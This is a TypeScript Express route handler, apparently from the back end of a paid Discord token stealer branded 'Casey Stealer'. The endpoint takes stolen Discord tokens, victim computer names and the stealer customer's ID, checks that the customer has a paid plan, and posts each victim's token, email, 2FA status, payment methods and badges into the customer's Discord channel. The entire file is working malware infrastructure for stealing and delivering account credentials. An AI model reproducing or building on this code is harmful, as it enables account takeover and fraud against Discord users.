import { Request, Response } from 'express';
import { emojis } from '../../utils/emojis';
import { ActionRowBuilder, ButtonBuilder, EmbedBuilder, ButtonStyle, ChannelType } from 'discord.js';

import { client } from '../../app';
import getAvatar from '../../functions/discord/getAvatar';

import { badges_name } from '../../utils/badges_name';
import { badges_emoji } from '../../utils/badges_emoji';

import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient()


export default {
    name: `/api/valid-tokens`, method: 'post',

    async execute(req: Request, res: Response) {
        const { valid_tokens, computer_name, stealer_user } = req.body;
        if(!valid_tokens.length || !stealer_user) return;

        const user = await prisma.users.findFirst({
            where: {
                id: stealer_user
            }
        });

        if(!user?.plan) return;

        const browsers = [...new Set(valid_tokens?.map((v: any) => v?.found_at))];

        const discordaccounts_embed = new EmbedBuilder().setColor(953553)
        .setAuthor({ name: `Casey | Discord Accounts [${valid_tokens.length}]`, iconURL: client.user?.avatarURL()! })
        .addFields(
            {
                name: `${emojis.folder} Tokens Found At:`,
                value: `${browsers.length ? browsers.join(', ') + '.' : 'Unknown.'}`
            },
        )
        .setFooter({ text: `Casey Stealer | ${computer_name}`, iconURL: client.user?.avatarURL()! });

        const guild = await client.guilds.fetch(user.guild_id!);
        const channel = await guild.channels.fetch(user.channel_id!);

        if(channel?.type !== ChannelType.GuildText) return;

        const message = await channel?.send({
            embeds: [
                discordaccounts_embed
            ]
        });

        const thread = await message.startThread({
            name: 'View Discord Accounts Informations',
            autoArchiveDuration: 60,
        });

        valid_tokens?.forEach(async(v: any) => {
        const avatar_url = getAvatar(v?.user?.data?.id, v.user.data.avatar);
        const badges_array = v.user.profile?.badges?.map((b: any) => badges_name.find(x => x?.id === b?.id))?.map((n: any) => n?.name);

            const firstaccount_embed = new EmbedBuilder().setColor('#5865f2').setTimestamp().setThumbnail(avatar_url)
            .setAuthor({ name: `Casey | ${v.user.data.global_name} (@${v.user.data.username})`, iconURL: avatar_url! })
            .addFields(
                {
                    name: `${emojis.token} Token:`,
                    value: `\`\`\`${v?.token}\`\`\``
                },
                {
                    name: `${emojis.badges} Badges:`,
                    value: `${badges_array?.map((b: any) => b != undefined ? badges_emoji[b as keyof typeof badges_emoji] : '')?.join('') || 'None'}`,
                    inline: true
                },
                {
                    name: `${emojis.pm} Billing:`,
                    value: `${v?.user?.payment_sources?.filter((p: any) => p?.type === 1 || p?.type === 2)?.map((b: any) => b?.type != undefined ? emojis[b?.type as keyof typeof emojis] : '')?.join('') || 'None'}`,
                    inline: true
                },
                {
                    name: `${emojis.twofa} 2FA:`,
                    value: `${v?.user?.data?.mfa_enabled ? 'Enabled': 'Disabled'}`,
                    inline: true
                },
                {
                    name: `${emojis.email} Email:`,
                    value: `${v.user.data.email}`,
                    inline: false
                },
            )
            .setFooter({ text: `Casey Stealer | ${v.found_at}`, iconURL: client.user?.avatarURL()! });

            const boost_button = new ButtonBuilder().setCustomId(`BIF${v.user.profile?.badges?.find((x: any) => x?.id.startsWith('guild_booster_'))?.id}Casey${v.user.profile?.premium_guild_since}`).setLabel('View Boost Informations').setStyle(ButtonStyle.Secondary).setDisabled(true);
            if(v.user.profile?.premium_guild_since) 
            boost_button.setDisabled(false);

            thread.send({
                embeds: [
                    firstaccount_embed
                ],
                components: [
                    new ActionRowBuilder<ButtonBuilder>().addComponents(
                        new ButtonBuilder().setCustomId(`HQF`).setLabel('View HQ Friends').setStyle(ButtonStyle.Primary)
                        .setEmoji(emojis.friends),
                        new ButtonBuilder().setCustomId(`HQG`).setLabel('View HQ Guilds').setStyle(ButtonStyle.Secondary),
                        boost_button
                    )
                ]
            });
        });

        res.status(200);
  },
};
